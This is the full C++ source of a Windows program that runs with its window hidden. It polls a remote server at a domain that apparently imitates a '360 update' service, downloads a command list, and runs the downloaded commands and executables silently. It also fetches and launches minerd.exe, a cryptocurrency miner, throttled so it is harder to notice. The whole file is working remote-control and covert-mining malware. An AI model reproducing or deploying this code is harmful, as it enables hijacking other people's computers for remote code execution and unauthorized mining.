#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

#include <stdio.h>
#include <windows.h> 
#include <winbase.h>
#include <urlmon.h>
#include <string>
#include <atomic>
#include <fstream>
#include <time.h>

#include "util.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Kernel32.lib")

inline void add_params_to_url(const std::string& input, std::string* output) {
	output->append(input);
	output->append("?");
	output->append("ts=");
	char timestamp[256];
	sprintf_s(timestamp, "%lld", time(NULL));
	output->append(timestamp);
}

inline HRESULT download_url_to_file(const std::string& url, const std::string& file_name) {
	std::string final_url;
	add_params_to_url(url, &final_url);
	return URLDownloadToFileA( NULL, final_url.c_str(), file_name.c_str(), 0, NULL);
}

inline HRESULT download_file_from_url(const std::string& base_url, const std::string& file_name) {
	return download_url_to_file(base_url + file_name, file_name);
}

void download_minerd_from_web(const std::string& base_url) {
	HRESULT hr = download_file_from_url(base_url, "config.json");
	hr = download_file_from_url(base_url, "libcurl-4.dll");
	hr = download_file_from_url(base_url, "minerd.exe");
	hr = download_file_from_url(base_url, "pthreadGC2.dll");
}

boolean execute_cmd(const std::string& exe, const std::string& cmd_line) {
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stderr;
	si.hStdOutput = stdout;
    ZeroMemory( &pi, sizeof(pi) );
	if( !CreateProcessA( (LPSTR)(exe.c_str()),   // No module name (use command line)
		(LPSTR)(cmd_line.c_str()),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        IDLE_PRIORITY_CLASS | CREATE_NO_WINDOW,              // Creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return false;
	}
	
	// Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
	return true;
}

boolean execute_cmd_with_throttle(const std::string& exe,
								  const std::string& cmd_line,
								  LPThrottledProcess tp) {
	STARTUPINFOA si;
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdError = stderr;
	si.hStdOutput = stdout;
    ZeroMemory( &(tp->pi), sizeof(tp->pi) );
	if( !CreateProcessA( (LPSTR)(exe.c_str()),   // No module name (use command line)
		(LPSTR)(cmd_line.c_str()),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        IDLE_PRIORITY_CLASS | CREATE_NO_WINDOW,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &(tp->pi) )           // Pointer to PROCESS_INFORMATION structure
    ) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return false;
	}

	tp->ti.process_id = tp->pi.dwProcessId;
	tp->ti.should_stop = false;

	tp->handle = create_throttle_thread(&(tp->ti));
	if (tp->handle == NULL) {
		return false;
	} else {
		return true;
	}
}

void wait_for_throttled_cmd(LPThrottledProcess tp) {
	if (!tp->exec_succeed) return;
	// Wait until child process exits.
    WaitForSingleObject(tp->pi.hProcess, INFINITE);
	tp->ti.should_stop = true;
	WaitForSingleObject(tp->handle, INFINITE);

    // Close process and thread handles.
    CloseHandle( tp->pi.hProcess );
    CloseHandle( tp->pi.hThread );
	CloseHandle(tp->handle);
}

void terminate_throttled_cmd(LPThrottledProcess tp) {
	if (!tp->exec_succeed) return;
	TerminateProcess(tp->pi.hProcess, 0);
	tp->ti.should_stop = true;
	WaitForSingleObject(tp->handle, INFINITE);

    // Close process and thread handles.
    CloseHandle( tp->pi.hProcess );
    CloseHandle( tp->pi.hThread );
	CloseHandle(tp->handle);
}

bool get_meta_from_file(const std::string& cmd_list_file, LPMetaData meta) {
	std::ifstream ifs(cmd_list_file);
	if (!ifs.good()) return false;
	std::string line;
	if (std::getline(ifs, line)) {
		// first line is timestamp
		meta->timestamp = atol(line.c_str());
	}
	if (std::getline(ifs, line)) {
		// second line is interval
		meta->check_interval = atol(line.c_str());
	}

	return true;
}

void execute_cmd_list(const std::string& cmd_list_file, LPThrottledProcess tp) {
	tp->exec_succeed = false;
	std::ifstream ifs(cmd_list_file);
	if (!ifs.good()) return;
	std::string line;
	std::vector<std::string> tokens;
	while (std::getline(ifs, line)) {
		tokens.clear();
		
		// empty line
		if (line.size() == 0) continue;
		// comment
		if (line[0] == '#') continue;

		split(line, &tokens, ' ');
		if (tokens.size() == 0u) continue;

		// valid command
		printf("%s\n", line.c_str());

		if (tokens[0] == "exec" && tokens.size() > 1) {
			// execute a command
			std::string exe = tokens[1];
			std::string cmd_line;
			join(tokens, &cmd_line, " ", 1, tokens.size());
			if (!execute_cmd(exe, cmd_line)) break;
		} else if (tokens[0] == "download" && tokens.size() == 3) {
			// download a file
			std::string url = tokens[1];
			std::string file = tokens[2];
			if (S_OK != download_url_to_file(url, file)) break;
		} else if (tokens[0] == "throttle" && tokens.size() > 4) {
			// execute a command with throttle control
			std::string exe = tokens[4];
			std::string cmd_line;
			join(tokens, &cmd_line, " ", 4, tokens.size());
			tp->ti.percentage = atoi(tokens[1].c_str());
			tp->ti.throttle_time = atoi(tokens[2].c_str());
			tp->ti.revisit_time = atoi(tokens[3].c_str());
			tp->exec_succeed = execute_cmd_with_throttle(exe, cmd_line, tp);
			// the throttle command has to be the last one in order.
			break;
		}
	}
}

int main(int argc, char* argv[])
{
	boolean has_console = AttachConsole(ATTACH_PARENT_PROCESS);
	if (has_console) {
		// console
		printf("\n");
	}

	MetaData meta;
	meta.timestamp = -1;
	meta.check_interval = 1;
	while (true) {
		ThrottledProcess tp;
		execute_cmd_list("cmd_list.txt", &tp);
		while (true) {
			Sleep(meta.check_interval);
			download_url_to_file("http://360update.ckopenlab.com/cmd.php", "cmd_list.txt");
			MetaData tmp;
			if (!get_meta_from_file("cmd_list.txt", &tmp)) continue;
			if (tmp.timestamp != meta.timestamp) {
				terminate_throttled_cmd(&tp);
				meta = tmp;
				break;
			}
		}
	}

	if (has_console) {
		FreeConsole();
	}
	return 0;
}